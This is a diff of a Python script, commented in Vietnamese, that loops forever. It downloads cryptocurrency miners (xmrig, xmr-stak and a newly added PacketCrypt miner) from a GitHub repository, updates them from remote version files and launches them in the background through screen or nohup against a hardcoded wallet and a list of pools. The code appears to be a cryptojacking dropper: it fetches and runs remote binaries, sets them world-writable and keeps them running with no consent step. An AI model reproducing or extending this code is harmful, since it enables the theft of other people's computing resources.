@@ -74,9 +74,9 @@ while True:
             pass
     #utopia
     if operate_system == 'lin':
-        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
-        link_download_xmrig = 'https://github.com/giautoidi/giautoidi/raw/beta/daonhanh/xmrig_linux.gz'
-        link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/command_xmrig'
+        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_xmrig'
+        link_download_xmrig = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/xmrig_linux.gz'
+        link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/command_xmrig'
         gz_name = 'xmrig_linux.gz'
         folder_xmrig = 'xmrig_linux'
         xmrig_name = 'xmrig'
@@ -158,12 +158,6 @@ while True:
         folder_xmrig = 'xmr-stak-linux-2.10.8-cpu_cuda-nvidia'
         xmrig_name = 'xmr-stak'
         try:
-            os.system('apt-get install -y nvidia-driver-470')
-            os.system('modprobe nvidia')
-            os.system('nvidia-smi')
-        except:
-            pass
-        try:
             if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
                 print('Chua co chuong trinh %s' %xmrig_name)
                 os.chdir('/opt')
@@ -217,4 +211,64 @@ while True:
             else:
                 os.system ('%s &' %command)
 
+        #pkt
+        
+        link_version_pkt = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_pkt'
+        link_download_pkt = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/packetcrypt-v0.5.1-linux_amd64'
+        pkt_name = 'packetcrypt'
+        try:
+            if not os.path.isfile('/opt/%s' % pkt_name):
+                print('Chua co chuong trinh %s' % pkt_name)
+                os.chdir('/opt')
+                os.system('wget %s -O %s' % (link_download_pkt, pkt_name))
+                os.system('chmod 777 %s' % pkt_name)
+            else:
+                print('Da co chuong trinh %s' % pkt_name)
+        except:
+            pass
+        try:
+            command = '/opt/%s --version' % pkt_name
+            output = subprocess.check_output(command, shell=True).decode('utf-8')
+            #print(output)
+            #time.sleep(10000)
+            version_tam = output.split(' ')
+            version_pkt = version_tam[1].strip()
+            print('Version pkt la %s' %version_pkt)
+            response = requests.get(link_version_pkt, timeout=timeout)
+            get_version_pkt = response.text.strip()
+            print('Version pkt lay tren web la %s' %get_version_pkt)
+            #Check version uam
+            if get_version_pkt == version_pkt and len(get_version_pkt) < 50:
+                print('pkt dang o phien ban moi nhat %s' %version_pkt)
+            if get_version_pkt != version_pkt and len(get_version_pkt) < 50:
+                os.system('pkill %s' % pkt_name)
+                print('pkt da co phien ban moi, tien hanh update thoi')
+                os.chdir('/opt')
+                os.system('rm -rf /opt/%s' % pkt_name)
+                os.system('wget %s' % link_download_pkt)
+        except:
+            pass
+
+        try:
+            pkt_dachay = False
+            for proc in psutil.process_iter():
+                process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
+                #print(process_name['name'])
+                if pkt_name == process_name['name']:
+                    print('Da co chuong trinh %s chay' % pkt_name)
+                    pkt_dachay = True
+                    break
+        except:
+            pass
+        if pkt_dachay == False:
+            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.k1m3r4.com/ http://p.master.pktdigger.com/ http://pool.pkteer.com http://pool.pkthash.com -t 2' % pkt_name
+            print(command)
+            if os.path.isfile('/usr/bin/screen'):
+                print('Co chuong trinh screen')
+                os.system ('screen -dmS %s %s' %(pkt_name, command))
+            elif os.path.isfile('/usr/bin/nohup'):
+                print('Co chuong trinh nohup')
+                os.system ('nohup %s &' %command)
+            else:
+                os.system ('%s &' %command)
     time.sleep(thoi_gian_nghi)
